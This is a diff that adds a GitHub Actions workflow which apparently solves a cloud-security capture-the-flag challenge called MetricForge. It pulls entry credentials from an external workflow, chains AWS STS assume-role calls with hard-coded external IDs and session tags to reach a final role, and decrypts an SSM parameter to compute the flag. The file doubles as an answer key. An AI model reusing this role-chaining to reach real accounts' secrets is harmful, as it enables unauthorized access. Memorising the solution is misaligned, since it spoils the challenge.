@@ -1,0 +1,164 @@
+name: MetricForge final solve
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  mint:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      entry_role: arn:aws:iam::125746528491:role/metricforge-entry-b8358a07fc
+      nonce: participant
+
+  solve:
+    needs: mint
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      actions: read
+
+    steps:
+      - name: Download entry session
+        uses: actions/download-artifact@v4
+        with:
+          name: metricforge-entry-session-participant
+          path: session
+
+      - name: Read final seed and calculate flag
+        shell: bash
+        run: |
+          set -euo pipefail
+          export AWS_PAGER=""
+          export AWS_DEFAULT_REGION="us-east-1"
+          mkdir -p metricforge-final-result
+
+          SESSION_FILE="$(find session -maxdepth 2 -type f | head -n 1)"
+          test -n "${SESSION_FILE}" || {
+            echo "Entry session artifact is empty"
+            exit 1
+          }
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId // .credentials.AccessKeyId // .AccessKeyId // empty' "${SESSION_FILE}")"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey // .credentials.SecretAccessKey // .SecretAccessKey // empty' "${SESSION_FILE}")"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken // .credentials.SessionToken // .SessionToken // empty' "${SESSION_FILE}")"
+
+          test -n "${AWS_ACCESS_KEY_ID}" || {
+            echo "Could not parse entry credentials"
+            exit 1
+          }
+
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          aws sts assume-role \
+            --role-arn "arn:aws:iam::125746528491:role/metricforge-broker-9d7a0ac7cc" \
+            --role-session-name "recover-30b28c53" \
+            --external-id "mf-broker-bdeeb30544829362" \
+            --source-identity "git-30b28c539ebd" \
+            --tags \
+              "Key=AmiId,Value=ami-0efca712577c4c937" \
+              "Key=Attestation,Value=bdeeb30544829362" \
+            --transitive-tag-keys AmiId Attestation \
+            --duration-seconds 3600 \
+            --output json > broker-session.json
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' broker-session.json)"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' broker-session.json)"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' broker-session.json)"
+
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          aws sts assume-role \
+            --role-arn "arn:aws:iam::125746528491:role/metricforge-final-329005447e" \
+            --role-session-name "final-77c4c937" \
+            --external-id "01c4cc693cad98d62dbba067" \
+            --duration-seconds 3600 \
+            --output json > final-session.json
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' final-session.json)"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' final-session.json)"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' final-session.json)"
+
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          aws sts get-caller-identity --output json \
+            > metricforge-final-result/final-identity.json
+
+          aws ssm get-parameter \
+            --region "ap-northeast-2" \
+            --name "/metricforge/recovery/final-seed" \
+            --with-decryption \
+            --output json \
+            > metricforge-final-result/final-seed.json
+
+          python3 - <<'PY'
+          import hashlib
+          import hmac
+          import json
+          from pathlib import Path
+
+          A = "5be464357414"
+          B = "ami-0efca712577c4c937"
+          C = "bdeeb30544829362"
+          domain = "metricforge.swua.kr"
+
+          parameter_doc = json.loads(
+              Path("metricforge-final-result/final-seed.json").read_text()
+          )
+          seed = parameter_doc["Parameter"]["Value"]
+
+          message = f"{A}|{B}|{C}|{domain}"
+          D = hmac.new(
+              seed.encode("utf-8"),
+              message.encode("utf-8"),
+              hashlib.sha256,
+          ).hexdigest()[:16]
+
+          flag_input = f"{A}_{B}_{C}_{D}"
+          outer = hashlib.sha256(flag_input.encode("utf-8")).hexdigest()
+          flag = f"SCA{{{outer}}}"
+
+          result = {
+              "A": A,
+              "B": B,
+              "C": C,
+              "D": D,
+              "hmac_message": message,
+              "flag_input": flag_input,
+              "flag": flag,
+          }
+
+          Path("metricforge-final-result/result.json").write_text(
+              json.dumps(result, ensure_ascii=False, indent=2) + "\n"
+          )
+          Path("metricforge-final-result/FLAG.txt").write_text(flag + "\n")
+
+          print("A =", A)
+          print("B =", B)
+          print("C =", C)
+          print("D =", D)
+          print("FLAG =", flag)
+          PY
+
+          rm -rf session broker-session.json final-session.json
+
+      - name: Upload final result
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-final-result
+          path: metricforge-final-result
+          if-no-files-found: warn
+          retention-days: 1
